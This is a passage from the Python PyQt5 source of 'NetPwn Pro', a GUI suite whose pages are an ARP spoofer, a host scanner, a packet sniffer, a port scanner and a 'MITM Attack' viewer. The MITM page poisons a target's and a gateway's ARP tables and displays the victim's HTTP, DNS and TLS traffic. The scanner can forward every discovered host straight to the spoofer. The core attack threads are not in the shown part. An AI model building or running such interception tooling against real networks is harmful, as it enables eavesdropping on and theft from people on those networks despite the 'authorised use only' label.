        lh.addWidget(SectionLabel("Activity Log"))
        btn_clrl = QPushButton("Clear"); btn_clrl.setObjectName("Ghost")
        btn_clrl.setFixedWidth(60)
        btn_clrl.clicked.connect(lambda: self._log.clear())
        lh.addWidget(btn_clrl)
        lcl.addLayout(lh)
        self._log = LogBox()
        lcl.addWidget(self._log)
        right.addWidget(log_card, 1)

        root.addLayout(left, 4)
        root.addLayout(right, 6)

    @staticmethod
    def _get_ifaces():
        if SCAPY_OK:
            try: return list(scapy.get_if_list())
            except: pass
        return ["eth0", "wlan0", "lo"]

    def _add_target(self):
        ip = self._tgt_in.text().strip()
        if not ip or ip in self._targets: return
        self._targets.append(ip)
        self._tgt_list.addItem(f"  {ip}")
        self._tgt_in.clear()
        self._tgt_count.setText(f"{len(self._targets)} target{'s' if len(self._targets)!=1 else ''}")
        self._log.append_log(f"Target added: {ip}", "ok")

    def _remove_target(self):
        for i in sorted([x.row() for x in self._tgt_list.selectedIndexes()], reverse=True):
            ip = self._tgt_list.item(i).text().strip()
            self._targets.pop(i); self._tgt_list.takeItem(i)
            self._log.append_log(f"Target removed: {ip}", "warn")
        self._tgt_count.setText(f"{len(self._targets)} target{'s' if len(self._targets)!=1 else ''}")

    def _clear_targets(self):
        if not self._targets: return
        if QMessageBox.question(self,"Clear","Remove all targets?") != QMessageBox.Yes: return
        self._targets.clear(); self._tgt_list.clear()
        self._tgt_count.setText("0 targets")
        self._log.append_log("All targets cleared.", "warn")

    def _start(self):
        if not SCAPY_OK:
            QMessageBox.critical(self,"Scapy Missing","pip install scapy"); return
        gw = self._gw_in.text().strip()
        if not gw or not self._targets:
            QMessageBox.warning(self,"Input Error","Set gateway and at least one target."); return
        self._total_pkts = 0; self._start_time = time.time()
        self._btn_start.setEnabled(False); self._btn_stop.setEnabled(True)
        self._card_tgts.set_value(len(self._targets))
        self._log.append_log(f"Attack started  GW:{gw}  Targets:{len(self._targets)}", "ok")
        self._arp_thread = ARPThread(gw, list(self._targets))
        self._arp_thread.pkt_sent.connect(self._on_pkt_sent)
        self._arp_thread.log.connect(self._log.append_log)
        self._arp_thread.start()
        self._timer.start(); self._chart_timer.start()

    def _stop(self):
        self._timer.stop(); self._chart_timer.stop()
        self._btn_stop.setEnabled(False)
        if self._arp_thread: self._arp_thread.stop()
        self._log.append_log("Stopping — restoring ARP tables…", "warn")
        self._rst_thread = RestoreThread(self._gw_in.text().strip(), list(self._targets))
        self._rst_thread.log.connect(self._log.append_log)
        self._rst_thread.done.connect(self._on_restored)
        self._rst_thread.start()

    def _on_pkt_sent(self, n):
        self._total_pkts += n
        self._pps += n
        self._card_pkts.set_value(self._total_pkts)

    def _on_restored(self):
        self._btn_start.setEnabled(True)
        self._card_tgts.set_value(0)
        self._log.append_log("Network restored ✓", "ok")

    def _tick(self):
        if self._start_time:
            e = int(time.time()-self._start_time)
            h, r = divmod(e, 3600); m, s = divmod(r, 60)
            self._card_time.set_value(f"{h:02d}:{m:02d}:{s:02d}")

    def _chart_tick(self):
        self._card_pps.set_value(self._pps)
        self._chart.push(self._pps)
        self._pps = 0

    def load_targets(self, ips: list[str]):
        for ip in ips:
            if ip not in self._targets:
                self._targets.append(ip)
                self._tgt_list.addItem(f"  {ip}")
        self._tgt_count.setText(f"{len(self._targets)} targets")
        self._log.append_log(f"Imported {len(ips)} targets from scanner.", "cyan")

# ─────────────────────────────────────────────────
#  PAGE 2 — NETWORK SCANNER
# ─────────────────────────────────────────────────
class ScannerPage(QWidget):
    send_to_spoofer = pyqtSignal(list)

    def __init__(self, parent=None):
        super().__init__(parent)
        self._scan_thread = None
        self._build()

    def _build(self):
        root = QVBoxLayout(self); root.setContentsMargins(20,16,20,16); root.setSpacing(12)

        cfg = QFrame(); cfg.setObjectName("Card")
        cl  = QVBoxLayout(cfg); cl.setContentsMargins(16,14,16,14); cl.setSpacing(10)
        cl.addWidget(SectionLabel("Scan Configuration"))
        row = QHBoxLayout()
        self._cidr_in = QLineEdit("192.168.1.0/24")
        self._cidr_in.setPlaceholderText("CIDR  e.g. 192.168.1.0/24")
        self._btn_scan = QPushButton("⬡  Scan Network"); self._btn_scan.setObjectName("Accent")
        self._btn_scan.clicked.connect(self._start_scan)
        self._btn_stop_scan = QPushButton("■ Stop"); self._btn_stop_scan.setObjectName("Stop")
        self._btn_stop_scan.setEnabled(False)
        self._btn_stop_scan.clicked.connect(self._stop_scan)
        row.addWidget(QLabel("Target Range:")); row.addWidget(self._cidr_in,1)
        row.addWidget(self._btn_scan); row.addWidget(self._btn_stop_scan)
        cl.addLayout(row)
        self._prog = QProgressBar(); self._prog.setValue(0)
        cl.addWidget(self._prog)
        self._scan_status = QLabel("Idle")
        self._scan_status.setStyleSheet(f"color:{MUTED}; border:none; font-size:11px;")
        cl.addWidget(self._scan_status)
        root.addWidget(cfg)

        res_card = QFrame(); res_card.setObjectName("Card")
        rcl = QVBoxLayout(res_card); rcl.setContentsMargins(16,14,16,14)
        rh = QHBoxLayout()
        rh.addWidget(SectionLabel("Discovered Hosts"))
        self._found_lbl = QLabel("0 hosts")
        self._found_lbl.setStyleSheet(f"color:{ACC}; font-weight:bold; border:none;")
        rh.addWidget(self._found_lbl)
        rh.addStretch()
        btn_export = QPushButton("⤓ Export CSV"); btn_export.setObjectName("Ghost")
        btn_export.clicked.connect(self._export_csv)
        btn_send   = QPushButton("→ Send to Spoofer"); btn_send.setObjectName("Purple")
        btn_send.clicked.connect(self._send_to_spoofer)
        rh.addWidget(btn_export); rh.addWidget(btn_send)
        rcl.addLayout(rh)

        self._table = QTableWidget(0, 5)
        self._table.setHorizontalHeaderLabels(["IP Address","MAC Address","Hostname","Vendor","Status"])
        self._table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        self._table.verticalHeader().setVisible(False)
        self._table.setSelectionBehavior(QAbstractItemView.SelectRows)
        self._table.setEditTriggers(QAbstractItemView.NoEditTriggers)
        rcl.addWidget(self._table)
        root.addWidget(res_card, 1)

        log_card = QFrame(); log_card.setObjectName("Card")
        ll = QVBoxLayout(log_card); ll.setContentsMargins(14,10,14,10)
        ll.addWidget(SectionLabel("Scan Log"))
        self._log = LogBox(); self._log.setMaximumHeight(120)
        ll.addWidget(self._log)
        root.addWidget(log_card)

    def _start_scan(self):
        if not SCAPY_OK:
            QMessageBox.critical(self,"Scapy Missing","pip install scapy"); return
        self._table.setRowCount(0)
        self._prog.setValue(0)
        self._btn_scan.setEnabled(False)
        self._btn_stop_scan.setEnabled(True)
        self._scan_status.setText("Scanning…")
        self._found_lbl.setText("0 hosts")
        cidr = self._cidr_in.text().strip()
        self._log.append_log(f"Starting ARP scan on {cidr}", "ok")
        self._scan_thread = ScanThread(cidr)
        self._scan_thread.found.connect(self._on_found)
        self._scan_thread.progress.connect(self._prog.setValue)
        self._scan_thread.done.connect(self._on_done)
        self._scan_thread.log.connect(self._log.append_log)
        self._scan_thread.start()

    def _stop_scan(self):
        if self._scan_thread: self._scan_thread.stop()
        self._scan_status.setText("Stopped by user.")
        self._btn_scan.setEnabled(True); self._btn_stop_scan.setEnabled(False)

    def _on_found(self, ip, mac, host, vendor):
        r = self._table.rowCount(); self._table.insertRow(r)
        for c, val in enumerate([ip, mac, host, vendor, "Online"]):
            item = QTableWidgetItem(val)
            if c == 4: item.setForeground(QColor(ACC))
            self._table.setItem(r, c, item)
        self._found_lbl.setText(f"{r+1} host{'s' if r else ''}")
        self._log.append_log(f"Found: {ip}  [{mac}]  {host}  {vendor}", "cyan")

    def _on_done(self, n):
        self._scan_status.setText(f"Scan complete — {n} host{'s' if n!=1 else ''} found.")
        self._btn_scan.setEnabled(True); self._btn_stop_scan.setEnabled(False)
        self._prog.setValue(100)
        self._log.append_log(f"Scan finished. {n} host(s) discovered.", "ok")

    def _send_to_spoofer(self):
        ips = []
        for r in range(self._table.rowCount()):
            ips.append(self._table.item(r, 0).text())
        self.send_to_spoofer.emit(ips)

    def _export_csv(self):
        path, _ = QFileDialog.getSaveFileName(self,"Export CSV","scan_results.csv","CSV Files (*.csv)")
        if not path: return
        with open(path, "w", newline="") as f:
            w = csv.writer(f)
            w.writerow(["IP","MAC","Hostname","Vendor","Status"])
            for r in range(self._table.rowCount()):
                w.writerow([self._table.item(r,c).text() for c in range(5)])
        self._log.append_log(f"Exported to {path}", "ok")

# ─────────────────────────────────────────────────
#  PAGE 3 — PACKET SNIFFER
# ─────────────────────────────────────────────────
class SnifferPage(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self._sniff_thread = None
        self._pkt_no       = 0
        self._counts       = {"TCP":0,"UDP":0,"ICMP":0,"ARP":0,"Other":0}
        self._build()

    def _build(self):
        root = QVBoxLayout(self); root.setContentsMargins(20,16,20,16); root.setSpacing(12)

        ctrl_card = QFrame(); ctrl_card.setObjectName("Card")
        cc = QVBoxLayout(ctrl_card); cc.setContentsMargins(16,14,16,14)
        cc.addWidget(SectionLabel("Capture Settings"))
        row = QHBoxLayout()
        self._iface_in = QLineEdit()
        self._iface_in.setPlaceholderText("Interface (blank = default)")
        self._filter_in = QLineEdit()
        self._filter_in.setPlaceholderText("BPF Filter  e.g. tcp or udp port 53")
        self._btn_sniff = QPushButton("⬡  Start Capture"); self._btn_sniff.setObjectName("Start")
        self._btn_sniff_stop = QPushButton("■ Stop"); self._btn_sniff_stop.setObjectName("Stop")
        self._btn_sniff_stop.setEnabled(False)
        self._btn_sniff.clicked.connect(self._start_sniff)
        self._btn_sniff_stop.clicked.connect(self._stop_sniff)
        btn_clear = QPushButton("⊘ Clear"); btn_clear.setObjectName("Ghost")
        btn_clear.clicked.connect(self._clear)
        row.addWidget(QLabel("Interface:")); row.addWidget(self._iface_in)
        row.addWidget(QLabel("Filter:")); row.addWidget(self._filter_in, 1)
        row.addWidget(self._btn_sniff); row.addWidget(self._btn_sniff_stop)
        row.addWidget(btn_clear)
        cc.addLayout(row)
        root.addWidget(ctrl_card)

        splitter = QSplitter(Qt.Vertical)

        tbl_frame = QFrame(); tbl_frame.setObjectName("Card")
        tfl = QVBoxLayout(tbl_frame); tfl.setContentsMargins(14,10,14,10)

        th = QHBoxLayout()
        th.addWidget(SectionLabel("Captured Packets"))
        self._pkt_count_lbl = QLabel("0 packets")
        self._pkt_count_lbl.setStyleSheet(f"color:{ACC}; font-weight:bold; border:none;")
        self._dot = PulsingDot(DANGER, 10)
        th.addWidget(self._dot); th.addWidget(self._pkt_count_lbl); th.addStretch()
        self._proto_labels = {}
        for proto, color in [("TCP",ACC2),("UDP",WARN),("ICMP",ACC3),("ARP",ACC),("Other",MUTED)]:
            lbl = QLabel(f"{proto}: 0")
            lbl.setStyleSheet(f"color:{color};font-size:11px;font-weight:bold;border:none;")
            th.addWidget(lbl); th.addSpacing(8)
            self._proto_labels[proto] = lbl
        tfl.addLayout(th)

        self._pkt_table = QTableWidget(0, 6)
        self._pkt_table.setHorizontalHeaderLabels(["#","Time","Source","Destination","Proto","Length"])
        self._pkt_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        self._pkt_table.verticalHeader().setVisible(False)
        self._pkt_table.setSelectionBehavior(QAbstractItemView.SelectRows)
        self._pkt_table.setEditTriggers(QAbstractItemView.NoEditTriggers)
        self._pkt_table.itemSelectionChanged.connect(self._show_detail)
        tfl.addWidget(self._pkt_table)
        splitter.addWidget(tbl_frame)

        bot = QFrame(); bot.setObjectName("Card")
        bl  = QHBoxLayout(bot); bl.setContentsMargins(14,10,14,10); bl.setSpacing(14)

        detail_lay = QVBoxLayout()
        detail_lay.addWidget(SectionLabel("Packet Details"))
        self._detail = QTextEdit(); self._detail.setReadOnly(True)
        self._detail.setFont(QFont("Consolas", 11))
        detail_lay.addWidget(self._detail)
        bl.addLayout(detail_lay, 3)

        chart_lay = QVBoxLayout()
        chart_lay.addWidget(SectionLabel("Packet Rate"))
        self._chart = AnimatedChart(DANGER, "pkt/s")
        self._chart.setMinimumHeight(120)
        chart_lay.addWidget(self._chart, 1)
        bl.addLayout(chart_lay, 2)

        splitter.addWidget(bot)
        splitter.setSizes([400, 180])
        root.addWidget(splitter, 1)

        self._rate_buf  = 0
        self._rate_timer = QTimer(self, interval=1000, timeout=self._rate_tick)

    def _start_sniff(self):
        if not SCAPY_OK:
            QMessageBox.critical(self,"Scapy","pip install scapy"); return
        self._btn_sniff.setEnabled(False); self._btn_sniff_stop.setEnabled(True)
        self._dot.start()
        iface  = self._iface_in.text().strip() or None
        bpf    = self._filter_in.text().strip()
        self._sniff_thread = SnifferThread(iface, bpf)
        self._sniff_thread.packet_cap.connect(self._on_packet)
        self._sniff_thread.log.connect(lambda m,t: None)
        self._sniff_thread.start()
        self._rate_timer.start()

    def _stop_sniff(self):
        if self._sniff_thread: self._sniff_thread.stop()
        self._btn_sniff.setEnabled(True); self._btn_sniff_stop.setEnabled(False)
        self._dot.stop(); self._rate_timer.stop()

    def _clear(self):
        self._pkt_table.setRowCount(0)
        self._pkt_no = 0; self._detail.clear()
        self._counts = {k:0 for k in self._counts}
        self._pkt_count_lbl.setText("0 packets")
        for k, lbl in self._proto_labels.items():
            lbl.setText(f"{k}: 0")

    def _on_packet(self, info: dict):
        self._pkt_no += 1; self._rate_buf += 1
        r = self._pkt_table.rowCount(); self._pkt_table.insertRow(r)

        proto = info.get("proto","?")
        color_map = {"TCP": ACC2,"UDP": WARN,"ICMP": ACC3,"ARP": ACC}
        pc = color_map.get(proto, MUTED)

        vals = [str(self._pkt_no), info.get("time",""),
                info.get("src","—"), info.get("dst","—"),
                proto, str(info.get("len",0))]
        for c, v in enumerate(vals):
            item = QTableWidgetItem(v)
            if c == 4: item.setForeground(QColor(pc))
            self._pkt_table.setItem(r, c, item)

        if self._pkt_table.rowCount() > 2000:
            self._pkt_table.removeRow(0)

        self._pkt_table.scrollToBottom()
        self._pkt_count_lbl.setText(f"{self._pkt_no} packets")
        k = proto if proto in self._counts else "Other"
        self._counts[k] += 1
        lbl = self._proto_labels.get(k)
        if lbl: lbl.setText(f"{k}: {self._counts[k]}")

        self._pkt_table.item(r, 0).setData(Qt.UserRole, info)

    def _show_detail(self):
        rows = self._pkt_table.selectedItems()
        if not rows: return
        r    = rows[0].row()
        info = self._pkt_table.item(r, 0).data(Qt.UserRole)
        if not info: return
        txt = "\n".join(f"  {k:12s}: {v}" for k,v in info.items())
        self._detail.setText(f"{'─'*40}\n{txt}\n{'─'*40}")

    def _rate_tick(self):
        self._chart.push(self._rate_buf)
        self._rate_buf = 0

# ─────────────────────────────────────────────────
#  PAGE 4 — PORT SCANNER
# ─────────────────────────────────────────────────
class PortScannerPage(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self._scan_thread = None
        self._build()

    def _build(self):
        root = QVBoxLayout(self); root.setContentsMargins(20,16,20,16); root.setSpacing(12)

        cfg = QFrame(); cfg.setObjectName("Card")
        cl  = QVBoxLayout(cfg); cl.setContentsMargins(16,14,16,14); cl.setSpacing(10)
        cl.addWidget(SectionLabel("Port Scan Configuration"))
        row = QHBoxLayout()
        row.addWidget(QLabel("Target IP:"))
        self._target_ip = QLineEdit()
        self._target_ip.setPlaceholderText("e.g. 192.168.1.1")
        row.addWidget(self._target_ip)
        row.addWidget(QLabel("Ports:"))
        self._port_range = QLineEdit("1-1024")
        self._port_range.setPlaceholderText("e.g. 22,80,443 or 1-1000")
        row.addWidget(self._port_range)
        row.addWidget(QLabel("Type:"))
        self._scan_type = QComboBox()
        self._scan_type.addItems(["connect", "syn"])
        row.addWidget(self._scan_type)
        self._btn_scan = QPushButton("⬡  Scan Ports"); self._btn_scan.setObjectName("Accent")
        self._btn_scan.clicked.connect(self._start_scan)
        self._btn_stop = QPushButton("■ Stop"); self._btn_stop.setObjectName("Stop")
        self._btn_stop.setEnabled(False)
        self._btn_stop.clicked.connect(self._stop_scan)
        row.addWidget(self._btn_scan); row.addWidget(self._btn_stop)
        cl.addLayout(row)

        self._prog = QProgressBar(); cl.addWidget(self._prog)
        self._status = QLabel("Idle"); self._status.setStyleSheet(f"color:{MUTED};")
        cl.addWidget(self._status)
        root.addWidget(cfg)

        res_card = QFrame(); res_card.setObjectName("Card")
        rcl = QVBoxLayout(res_card); rcl.setContentsMargins(16,14,16,14)
        rcl.addWidget(SectionLabel("Open Ports"))
        self._table = QTableWidget(0, 4)
        self._table.setHorizontalHeaderLabels(["Port","Service","Banner","Status"])
        self._table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        self._table.verticalHeader().setVisible(False)
        self._table.setSelectionBehavior(QAbstractItemView.SelectRows)
        rcl.addWidget(self._table)
        root.addWidget(res_card, 1)

        log_card = QFrame(); log_card.setObjectName("Card")
        ll = QVBoxLayout(log_card); ll.setContentsMargins(14,10,14,10)
        ll.addWidget(SectionLabel("Scan Log"))
        self._log = LogBox(); self._log.setMaximumHeight(100)
        ll.addWidget(self._log)
        root.addWidget(log_card)

    def _parse_ports(self, text):
        ports = set()
        for part in text.split(","):
            part = part.strip()
            if "-" in part:
                try:
                    start, end = map(int, part.split("-"))
                    ports.update(range(start, end+1))
                except:
                    pass
            else:
                try:
                    ports.add(int(part))
                except:
                    pass
        return sorted(ports)

    def _start_scan(self):
        target = self._target_ip.text().strip()
        port_txt = self._port_range.text().strip()
        scan_type = self._scan_type.currentText()
        ports = self._parse_ports(port_txt)
        if not target or not ports:
            QMessageBox.warning(self,"Input","Enter target IP and valid ports."); return
        self._table.setRowCount(0)
        self._prog.setMaximum(len(ports)); self._prog.setValue(0)
        self._btn_scan.setEnabled(False); self._btn_stop.setEnabled(True)
        self._status.setText(f"Scanning {target} ({len(ports)} ports)...")
        self._log.append_log(f"Starting {scan_type} scan on {target} ({len(ports)} ports)", "ok")
        self._scan_thread = PortScanThread(target, ports, scan_type)
        self._scan_thread.port_found.connect(self._on_port)
        self._scan_thread.progress.connect(self._on_progress)
        self._scan_thread.done.connect(self._on_done)
        self._scan_thread.log.connect(self._log.append_log)
        self._scan_thread.start()

    def _stop_scan(self):
        if self._scan_thread:
            self._scan_thread.stop()
        self._btn_scan.setEnabled(True); self._btn_stop.setEnabled(False)
        self._status.setText("Scan stopped")

    def _on_port(self, port, service, banner):
        r = self._table.rowCount(); self._table.insertRow(r)
        vals = [str(port), service or "—", banner or "—", "Open"]
        for c, v in enumerate(vals):
            item = QTableWidgetItem(v)
            if c == 3: item.setForeground(QColor(ACC))
            self._table.setItem(r, c, item)
        self._log.append_log(f"Port {port} open ({service})", "ok")

    def _on_progress(self, cur, total):
        self._prog.setValue(cur)

    def _on_done(self, count):
        self._btn_scan.setEnabled(True); self._btn_stop.setEnabled(False)
        self._status.setText(f"Scan finished. {count} open port(s).")
        self._log.append_log(f"Scan completed. {count} open ports.", "ok")

# ─────────────────────────────────────────────────
#  PAGE 5 — MITM ATTACK (FULL TRAFFIC VIEWER)
# ─────────────────────────────────────────────────
class MITMPage(QWidget):
    def __init__(self, parent=None):
        super().__init__(parent)
        self._arp_thread = None
        self._rst_thread = None
        self._sniffer_thread = None
        self._target_ip = ""
        self._gateway_ip = ""
        self._build()

    def _build(self):
        root = QVBoxLayout(self)
        root.setContentsMargins(20, 16, 20, 16)
        root.setSpacing(12)

        cfg = QFrame()
        cfg.setObjectName("Card")
        cl = QVBoxLayout(cfg)
        cl.setContentsMargins(16, 14, 16, 14)
        cl.setSpacing(10)
        cl.addWidget(SectionLabel("MITM Attack Configuration"))

        grid = QGridLayout()
        grid.setSpacing(10)
        grid.addWidget(QLabel("Target IP:"), 0, 0)
        self._target_input = QLineEdit()
        self._target_input.setPlaceholderText("e.g. 192.168.1.100")
        grid.addWidget(self._target_input, 0, 1)

        grid.addWidget(QLabel("Gateway IP:"), 1, 0)
        self._gateway_input = QLineEdit()
        self._gateway_input.setPlaceholderText("e.g. 192.168.1.1")
        grid.addWidget(self._gateway_input, 1, 1)

        grid.addWidget(QLabel("Interface:"), 2, 0)
        self._iface_combo = QComboBox()
        self._iface_combo.addItems(self._get_ifaces())
        grid.addWidget(self._iface_combo, 2, 1)

        self._show_all_check = QCheckBox("Show all IP packets (TCP/UDP/ICMP…)")
        self._show_all_check.setChecked(True)
        self._show_all_check.setStyleSheet(f"color:{TEXT}; border:none;")
        grid.addWidget(self._show_all_check, 3, 0, 1, 2)

        cl.addLayout(grid)

        btn_layout = QHBoxLayout()
        self._btn_start = QPushButton("🎭  Start MITM Attack")
        self._btn_start.setObjectName("Start")
        self._btn_stop = QPushButton("■  Stop & Restore")
        self._btn_stop.setObjectName("Stop")
        self._btn_stop.setEnabled(False)
        self._btn_start.clicked.connect(self._start_attack)
        self._btn_stop.clicked.connect(self._stop_attack)
        btn_layout.addWidget(self._btn_start)
        btn_layout.addWidget(self._btn_stop)
        cl.addLayout(btn_layout)

        root.addWidget(cfg)

        table_card = QFrame()
        table_card.setObjectName("Card")
        tcl = QVBoxLayout(table_card)
        tcl.setContentsMargins(16, 14, 16, 14)
        tcl.addWidget(SectionLabel("Target Live Activity (full traffic)"))

        self._activity_table = QTableWidget(0, 4)
        self._activity_table.setHorizontalHeaderLabels(["Time", "Type", "Direction", "Details"])
        self._activity_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        self._activity_table.verticalHeader().setVisible(False)
        self._activity_table.setEditTriggers(QAbstractItemView.NoEditTriggers)
        tcl.addWidget(self._activity_table)

        clear_btn = QPushButton("Clear Table")
        clear_btn.setObjectName("Ghost")
        clear_btn.clicked.connect(lambda: self._activity_table.setRowCount(0))
        tcl.addWidget(clear_btn, alignment=Qt.AlignRight)

        root.addWidget(table_card, 1)

        log_card = QFrame()
        log_card.setObjectName("Card")
        lcl = QVBoxLayout(log_card)
        lcl.setContentsMargins(14, 10, 14, 10)
        lcl.addWidget(SectionLabel("MITM Log"))
        self._log = LogBox()
        self._log.setMaximumHeight(150)
        lcl.addWidget(self._log)
        root.addWidget(log_card)

    @staticmethod
    def _get_ifaces():
        if SCAPY_OK:
            try:
                return list(scapy.get_if_list())
            except:
                pass
        return ["eth0", "wlan0", "lo"]

    def _start_attack(self):
        if not SCAPY_OK:
            QMessageBox.critical(self, "Scapy Missing", "pip install scapy")
            return
        target = self._target_input.text().strip()
        gateway = self._gateway_input.text().strip()
        if not target or not gateway:
            QMessageBox.warning(self, "Input Error", "Please enter target IP and gateway IP.")
            return

        self._target_ip = target
        self._gateway_ip = gateway
        self._btn_start.setEnabled(False)
        self._btn_stop.setEnabled(True)

        self._activity_table.setRowCount(0)
        self._log.append_log(f"MITM Attack started: Target {target} via Gateway {gateway}", "ok")

        self._arp_thread = ARPThread(gateway, [target])
        self._arp_thread.pkt_sent.connect(lambda n: None)  # optional
        self._arp_thread.log.connect(self._log.append_log)
        self._arp_thread.start()

        iface = self._iface_combo.currentText().strip() or None
        show_all = self._show_all_check.isChecked()
        self._sniffer_thread = MITMSnifferThread(target, gateway, iface, show_all)
        self._sniffer_thread.activity.connect(self._on_activity)
        self._sniffer_thread.log.connect(self._log.append_log)
        self._sniffer_thread.start()

    def _stop_attack(self):
        self._btn_stop.setEnabled(False)
        if self._arp_thread:
            self._arp_thread.stop()
        if self._sniffer_thread:
            self._sniffer_thread.stop()

        self._rst_thread = RestoreThread(self._gateway_ip, [self._target_ip])
        self._rst_thread.log.connect(self._log.append_log)
        self._rst_thread.done.connect(self._on_restored)
        self._rst_thread.start()
        self._log.append_log("Stopping MITM and restoring network...", "warn")

    def _on_restored(self):
        self._btn_start.setEnabled(True)
        self._log.append_log("MITM attack stopped, network restored.", "ok")

    def _on_activity(self, timestamp, atype, direction, details):
        row = self._activity_table.rowCount()
        self._activity_table.insertRow(row)
        self._activity_table.setItem(row, 0, QTableWidgetItem(timestamp))
        type_item = QTableWidgetItem(atype)
        if atype == "HTTP":
            type_item.setForeground(QColor(ACC2))
        elif atype == "DNS":
            type_item.setForeground(QColor(ACC3))
        elif atype == "TLS":
            type_item.setForeground(QColor(WARN))
        elif atype == "TCP":
            type_item.setForeground(QColor(ACC))
        elif atype == "UDP":
            type_item.setForeground(QColor(ACC2))
        elif atype == "ICMP":
            type_item.setForeground(QColor(MUTED))
        self._activity_table.setItem(row, 1, type_item)
        self._activity_table.setItem(row, 2, QTableWidgetItem(direction))
        self._activity_table.setItem(row, 3, QTableWidgetItem(details))
        self._activity_table.scrollToBottom()
        if self._activity_table.rowCount() > 500:
            self._activity_table.removeRow(0)

# ─────────────────────────────────────────────────
#  SIDEBAR + MAIN WINDOW (with 5 pages)
# ─────────────────────────────────────────────────
class NavButton(QPushButton):
    def __init__(self, icon, text, parent=None):
        super().__init__(f"  {icon}  {text}", parent)
        self.setObjectName("Nav")
        self.setCursor(Qt.PointingHandCursor)
        self.setMinimumHeight(48)
        self._active = False

    def set_active(self, v: bool):
        self._active = v
        self.setProperty("active", v)
        self.style().unpolish(self); self.style().polish(self)

    def enterEvent(self, event):
        if not self._active:
            self.setStyleSheet(f"background:rgba(0,255,136,.07); color:{TEXT}; border-left:3px solid transparent;")
        super().enterEvent(event)

    def leaveEvent(self, event):
        if not self._active:
            self.setStyleSheet(f"background:transparent; color:{MUTED}; border-left:3px solid transparent;")
        super().leaveEvent(event)


class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("NetPwn Pro — Advanced Network Security Suite")
        self.resize(1400, 820)
        self.setMinimumSize(1000, 640)
        self._build()
        self._splash()

    def _splash(self):
        self.setWindowOpacity(0.0)
        self._splash_anim = QPropertyAnimation(self, b"windowOpacity")
        self._splash_anim.setDuration(400)
        self._splash_anim.setStartValue(0.0)
        self._splash_anim.setEndValue(1.0)
        self._splash_anim.setEasingCurve(QEasingCurve.OutCubic)
        self._splash_anim.start()

    def _build(self):
        central = QWidget(); self.setCentralWidget(central)
        root    = QHBoxLayout(central); root.setContentsMargins(0,0,0,0); root.setSpacing(0)

        self._sidebar = QWidget(); self._sidebar.setObjectName("Sidebar")
        self._sidebar.setFixedWidth(230)
        sl = QVBoxLayout(self._sidebar); sl.setContentsMargins(0,0,0,0); sl.setSpacing(0)

        logo_w = QWidget(); logo_w.setObjectName("SideTop")
        logo_w.setFixedHeight(64)
        ll = QHBoxLayout(logo_w); ll.setContentsMargins(20,0,20,0)
        icon_lbl = QLabel("◈")
        icon_lbl.setStyleSheet(f"color:{ACC}; font-size:22px; border:none;")
        title_lbl= QLabel("NetPwn Pro")
        title_lbl.setStyleSheet(f"color:{TEXT}; font-size:15px; font-weight:bold; border:none;")
        ll.addWidget(icon_lbl); ll.addWidget(title_lbl); ll.addStretch()
        sl.addWidget(logo_w)

        sep = QFrame(); sep.setFrameShape(QFrame.HLine)
        sep.setStyleSheet(f"color:{BORDER};"); sl.addWidget(sep)
        sl.addSpacing(8)

        nav_items = [("⚡", "ARP Spoofer"), ("⬡", "Network Scanner"), ("⊡", "Packet Sniffer"), ("🔌", "Port Scanner"), ("🎭", "MITM Attack")]
        self._nav_btns = []
        for icon, label in nav_items:
            btn = NavButton(icon, label)
            btn.clicked.connect(lambda _, i=len(self._nav_btns): self._switch(i))
            sl.addWidget(btn); self._nav_btns.append(btn)

        sl.addStretch()

        bot_w = QWidget(); bot_w.setObjectName("SideTop")
        bl2 = QVBoxLayout(bot_w); bl2.setContentsMargins(16,10,16,14)
        self._scapy_badge = QLabel()
        self._scapy_badge.setAlignment(Qt.AlignCenter)
        self._scapy_badge.setStyleSheet(
            f"border-radius:4px; padding:4px 10px; font-size:11px; font-weight:bold; border:none; "
            + (f"background:rgba(0,255,136,.15); color:{ACC};" if SCAPY_OK
               else f"background:rgba(239,68,68,.15); color:{DANGER};"))
        self._scapy_badge.setText("● scapy ready" if SCAPY_OK else "● scapy missing")
        bl2.addWidget(self._scapy_badge)
        ver = QLabel("v5.0.0 · authorised use only")
        ver.setAlignment(Qt.AlignCenter)
        ver.setStyleSheet(f"color:{MUTED}; font-size:10px; border:none;")
        bl2.addWidget(ver)
        sl.addWidget(bot_w)
        root.addWidget(self._sidebar)

        self._stack = QStackedWidget()
        self._arp_page     = ARPPage()
        self._scanner_page = ScannerPage()
        self._sniffer_page = SnifferPage()
        self._port_page    = PortScannerPage()
        self._mitm_page    = MITMPage()
        self._stack.addWidget(self._arp_page)
        self._stack.addWidget(self._scanner_page)
        self._stack.addWidget(self._sniffer_page)
        self._stack.addWidget(self._port_page)
        self._stack.addWidget(self._mitm_page)
        self._scanner_page.send_to_spoofer.connect(self._on_import_targets)
        root.addWidget(self._stack, 1)

        sb = self.statusBar()
        sb.setStyleSheet(f"background:{SIDE}; color:{MUTED}; border-top:1px solid {BORDER};")
        sb.showMessage("  ◈ NetPwn Pro  —  For authorised penetration testing only")

        self._switch(0)

    def _switch(self, idx: int):
        self._stack.setCurrentIndex(idx)
        for i, btn in enumerate(self._nav_btns):
            btn.set_active(i == idx)

    def _on_import_targets(self, ips: list[str]):
        self._arp_page.load_targets(ips)
        self._switch(0)

# ─────────────────────────────────────────────────
#  ENTRY POINT
# ─────────────────────────────────────────────────
def main():
    app = QApplication(sys.argv)
    app.setStyle("Fusion")
    app.setStyleSheet(QSS)

    pal = QPalette()
    pal.setColor(QPalette.Window,          QColor(BG))
    pal.setColor(QPalette.WindowText,      QColor(TEXT))
    pal.setColor(QPalette.Base,            QColor(CARD))
    pal.setColor(QPalette.AlternateBase,   QColor(PANEL))
    pal.setColor(QPalette.Text,            QColor(TEXT))
    pal.setColor(QPalette.ButtonText,      QColor(TEXT))
    pal.setColor(QPalette.Button,          QColor(CARD))
    pal.setColor(QPalette.Highlight,       QColor(ACC))
    pal.setColor(QPalette.HighlightedText, QColor(BG))
    app.setPalette(pal)

    win = MainWindow()
    win.show()
    sys.exit(app.exec_())

if __name__ == "__main__":
    main()